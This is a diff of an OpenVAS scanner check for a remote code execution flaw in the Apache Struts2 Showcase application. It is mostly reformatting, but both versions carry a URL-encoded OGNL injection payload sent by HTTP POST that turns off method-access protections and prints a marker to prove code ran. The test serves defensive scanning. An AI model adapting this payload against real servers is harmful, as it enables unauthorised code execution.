@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_apache_struts_showcase_code_exec_vuln.nasl 9352 2018-04-06 07:13:02Z cfischer $
+# $Id: secpod_apache_struts_showcase_code_exec_vuln.nasl 11431 2018-09-17 11:54:52Z cfischer $
 #
 # Apache Struts2 Showcase Skill Name Remote Code Execution Vulnerability
 #
@@ -25,45 +25,44 @@
 ###############################################################################
 
 CPE = "cpe:/a:apache:struts";
+
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902924");
-  script_version("$Revision: 9352 $");
+  script_version("$Revision: 11431 $");
   script_bugtraq_id(55165);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 13:54:52 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-08-31 11:47:31 +0530 (Fri, 31 Aug 2012)");
   script_tag(name:"qod_type", value:"exploit");
   script_name("Apache Struts2 Showcase Skill Name Remote Code Execution Vulnerability");
 
-  script_tag(name: "summary" , value:"This host is running Apache Struts Showcase and is prone to
+  script_tag(name:"summary", value:"This host is running Apache Struts Showcase and is prone to
   java method execution vulnerability.");
 
-  script_tag(name: "vuldetect" , value:"Send a crafted data via HTTP POST request
+  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
   and check whether it is is able to execute arbitrary java methods or not.");
 
-  script_tag(name: "insight" , value:"The flaw is due to an improper validation of
+  script_tag(name:"insight", value:"The flaw is due to an improper validation of
   user data passed to the 'skillName' parameter in 'edit' and 'save' actions.");
 
-  script_tag(name: "impact" , value:"Successful exploitation could allow an attacker to execute
+  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to execute
   arbitrary java method. Further that results to disclose environment variables
-  or cause a denial of service or an arbitrary OS command can be executed.
+  or cause a denial of service or an arbitrary OS command can be executed.");
 
-  Impact Level: Application");
+  script_tag(name:"affected", value:"Apache Struts2 (Showcase) version 2.3.4.1 and prior");
 
-  script_tag(name: "affected" , value:"Apache Struts2 (Showcase) version 2.3.4.1 and prior");
-
-  script_tag(name: "solution" , value:"No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
+  script_tag(name:"solution", value:"No known solution was made available for at least one year
+  since the disclosure of this vulnerability. Likely none will be provided anymore.
   General solution options are to upgrade to a newer release, disable respective
   features, remove the product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
 
-  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/523956");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/115770/struts2-exec.txt");
-  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/apache-struts2-remote-code-execution");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/523956");
+  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/115770/struts2-exec.txt");
+  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/apache-struts2-remote-code-execution");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2012 SecPod");
@@ -71,18 +70,13 @@ if(description)
   script_mandatory_keys("ApacheStruts/installed");
   script_family("Web application abuses");
   script_require_ports("Services/www", 8080);
+
   exit(0);
 }
 
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-
-asport = 0;
-asRes = "";
-asReq = "";
-dir = "";
-url = "";
 
 if(!asport = get_app_port(cpe:CPE)){
   exit(0);
@@ -92,35 +86,35 @@ if(!dir = get_app_location(cpe:CPE, port:asport)){
   exit(0);
 }
 
+useragent = get_http_user_agent();
 host = http_host_name(port:asport);
 
 url = dir + "/showcase.action";
 if(http_vuln_check(port:asport, url:url,pattern:">Showcase</",
                      extra_check:">Struts Showcase<", check_header:TRUE))
 {
-    ## Construct the POST data
-    postdata = "currentSkill.name=%25%7B%28%23_memberAccess%5B%27allowStatic" +
-               "MethodAccess%27%5D%3Dtrue%29%28%23context%5B%27xwork.MethodA" +
-               "ccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23tmp%3D%40o" +
-               "rg.apache.struts2.ServletActionContext%40getResponse%28%29.g" +
-               "etWriter%28%29%2C%23tmp.println%28%27RCEWorked%27%29%2C%23tm" +
-               "p.close%28%29%29%7D&currentSkill.description=";
+  postdata = "currentSkill.name=%25%7B%28%23_memberAccess%5B%27allowStatic" +
+             "MethodAccess%27%5D%3Dtrue%29%28%23context%5B%27xwork.MethodA" +
+             "ccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23tmp%3D%40o" +
+             "rg.apache.struts2.ServletActionContext%40getResponse%28%29.g" +
+             "etWriter%28%29%2C%23tmp.println%28%27RCEWorked%27%29%2C%23tm" +
+             "p.close%28%29%29%7D&currentSkill.description=";
 
-    url = dir + "/skill/save.action";
+  url = dir + "/skill/save.action";
 
-    ## Construct the POST request
-    asReq = string("POST ", url," HTTP/1.1\r\n",
-                    "Host: ", host, "\r\n",
-                    "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
-                    "Content-Type: application/x-www-form-urlencoded\r\n",
-                    "Content-Length: ", strlen(postdata), "\r\n",
-                    "\r\n", postdata);
-    asRes = http_keepalive_send_recv(port:asport, data:asReq);
+  asReq = string("POST ", url," HTTP/1.1\r\n",
+                 "Host: ", host, "\r\n",
+                 "User-Agent: ", useragent, "\r\n",
+                 "Content-Type: application/x-www-form-urlencoded\r\n",
+                 "Content-Length: ", strlen(postdata), "\r\n",
+                 "\r\n", postdata);
+  asRes = http_keepalive_send_recv(port:asport, data:asReq);
 
-    ## Confirm the exploit
-    if(asRes && asRes =~ "HTTP/1\.[0-9]+ 200" && "RCEWorked" >< asRes)
-    {
-      security_message(asport);
-      exit(0);
-    }
+  if(asRes && asRes =~ "HTTP/1\.[0-9]+ 200" && "RCEWorked" >< asRes)
+  {
+    security_message(port:asport);
+    exit(0);
+  }
 }
+
+exit(99);
